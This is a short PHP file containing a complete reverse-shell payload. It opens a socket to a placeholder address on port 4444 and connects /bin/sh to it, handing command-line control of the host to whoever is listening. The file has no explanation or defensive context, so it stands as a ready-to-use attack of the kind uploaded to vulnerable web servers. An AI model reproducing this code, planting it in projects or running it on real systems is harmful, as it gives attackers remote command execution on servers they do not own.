<?php
$sock=fsockopen("<IP>",4444);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
